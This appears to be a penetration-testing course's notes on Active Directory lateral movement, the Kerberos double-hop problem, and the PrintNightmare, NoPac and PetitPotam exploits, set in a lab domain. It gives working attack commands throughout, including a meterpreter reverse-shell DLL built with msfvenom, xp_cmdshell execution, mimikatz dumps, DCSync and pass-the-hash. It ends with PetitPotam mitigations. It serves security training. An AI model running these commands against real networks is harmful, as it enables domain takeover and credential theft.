# Privileged Access

**if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol**

But what if we don't yet have local admin rights on any hosts in the domain? There are several other ways we can move around a Windows domain:
- Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host
- PowerShell Remoting - also referred to as **PSRemoting** or **Windows Remote Management (WinRM)** access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
- **MSSQL Server** - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
- CanRDP
- CanPSRemote
- SQLAdmin

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp !!!**

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote !!!**

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin !!!**


## Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines.

- **Enumerating the Remote Desktop Users Group**
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

- **Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

![image](https://github.com/user-attachments/assets/712f8b98-b426-4a8f-b066-4e30ee2d7f37)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

- **Checking Remote Access Rights using BloodHound**

![image](https://github.com/user-attachments/assets/38b66cc4-a663-43ed-a193-6cd903d9bebe)

We could also check the `Analysis` tab and run the pre-built queries` Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or **`mstsc.exe`** if attacking from a Windows host.

## WinRM

- **Enumerating the Remote Management Users Group**

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

- We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/user-attachments/assets/18da4436-a45c-4023-bfae-295174c63903)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

![image](https://github.com/user-attachments/assets/c1cd8123-422e-47f2-ad0f-d137636513bf)

- **Establishing WinRM Session from Windows**
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

- **Establishing WinRM Session from Linux**
```
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

## SQL Server Admin

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

- **Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/user-attachments/assets/ef9f5c01-26b4-409f-b81c-94686831751e)

- **Enumerating MSSQL Instances with PowerUpSQL**
```
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Reference: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

- We can also authenticate from our Linux attack host using `mssqlclient.py` from the Impacket toolkit.
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

- We could then choose `enable_xp_cmdshell` to enable the `xp_cmdshell` stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
```
enable_xp_cmdshell
```
- Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have `SeImpersonatePrivilege`, which can be leveraged in combination with a tool such as `JuicyPotato`, `PrintSpoofer`, or `RoguePotato` to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate` and `SeAssignPrimaryToken` of the Windows Privilege Escalation module.

```
xp_cmdshell whoami /priv
```

Reference: https://github.com/ohpe/juicy-potato

Reference: https://github.com/itm4n/PrintSpoofer

Reference: https://github.com/antonioCoco/RoguePotato

> ***Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.***


# Kerberos "Double Hop" Problem

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.

```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

**In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.**

Let's say we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.

![image](https://github.com/user-attachments/assets/f3a5d2db-c5d9-417f-a9fe-2c1148f99fc3)

When we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.

A few workarounds for the double-hop issue are covered in this post. We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an evil-winrm session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)

Reference: https://posts.slayerlabs.com/double-hop/

## Workarounds

### Workaround #1: PSCredential Object

We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.

- After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.
```
import-module .\PowerView.ps1
get-domainuser -spn
```
- If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
```
klist
```
- **So now, let's set up a PSCredential object and try again. First, we set up our authentication.**
```
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```
- **Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.**
```
get-domainuser -spn -credential $Cred | select samaccountname
```
- If we try again without specifying the -credential flag, we once again get an error message.
```
get-domainuser -spn | select samaccountname
```

If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.

### Workaround #2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the `Enter-PSSession` cmdlet? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).

- Let's start by first establishing a WinRM session on the remote host.
```
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

If we check for cached tickets using klist, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

We also cannot interact directly with the DC using PowerView

- **One trick we can use here is registering a new session configuration using the `Register-PSSessionConfiguration` cmdlet.**
```
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```
- **Once this is done, we need to restart the WinRM service by typing `Restart-Service` WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.**
- **After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.**
```
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

> Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .

> **We can also use other methods such as _CredSSP_, _port forwarding_, or _injecting into a process running in the context of a target user_ (sacrificial process) that we won't cover here.**

# Bleeding Edge Vulnerabilities

## ZeroLogon

Reference: https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/

## DCShadow

Reference: https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/

## PrintNightmare

> CVE-2021-34527, CVE-2021-1675

Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation.

```
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

We will then host this payload in an SMB share we create on our attack host using smbserver.py.
```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated `SYSTEM` shell.

Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.


## NoPac (SamAccountName Spoofing)

Reference: https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699

> CVE-2021-42278, CVE-2021-42287

intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command

- 42278 is a bypass vulnerability with the Security Account Manager (SAM).
- 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.

Reference: https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware

Reference: https://github.com/Ridter/noPac

Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed.

```
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to `10`. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to `0`. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

We will notice that a _semi-interactive shell_ session is established with the target using `smbexec.py`. Keep in mind with smbexec shells we will need to use _exact paths_ instead of navigating the directory structure using `cd`.

> We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a **DCSync** using `secretsdump.py`. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing `smbexec.py` does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a `.bat` file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

## PetitPotam (MS-EFSRPC)

> CVE-2021-36942

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the **Local Security Authority Remote Protocol (LSARPC)** by abusing Microsoft’s **Encrypting File System Remote Protocol (MS-EFSRPC)**. This technique allows an unauthenticated attacker to take over a Windows domain where **Active Directory Certificate Services (AD CS)** is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from **PKINITtools** to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

Reference: https://github.com/dirkjanm/PKINITtools

Reference: https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/

First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as `certi` to attempt to locate it.

Reference: https://github.com/zer1t0/certi

```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

Reference: https://github.com/topotam/PetitPotam

In another window, we can run the tool `PetitPotam.py`. We run this tool with the command py`thon3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to `Mimikatz` and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool `Invoke-PetitPotam.ps1`.

Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw method.

Reference: https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1

```
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

```

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the `KRB5CCNAME` environment variable, so our attack host uses this file for Kerberos authentication attempts.

```
export KRB5CCNAME=dc01.ccache
```

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the `ccache` file. We can see this by typing `klist` (using the `klist` command requires installation of the `krb5-user` package on our attack host. This is installed on ATTACK01 in the lab already).

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from `PKINITtools` we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

Reference: https://stealthbits.com/blog/what-is-the-kerberos-pac/

```
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

> Note: We would need to use the MS01 attack host in another section, such as the ACL Abuse Tactics or Privileged Access section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

```
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

We can then type klist to confirm that the ticket is in memory.

```
klist
```

Again, since Domain Controllers have replication privileges in the domain, we can use the **pass-the-ticket** to perform a **DCSync** attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the `KRBTGT` account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.

```
cd .\mimikatz\x64\
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```

#### PetitPotam Mitigations

First off, the patch for CVE-2021-36942 should be applied to any affected hosts. Below are some further hardening steps that can be taken:
- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper Certified Pre-Owned as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.

Reference: https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf













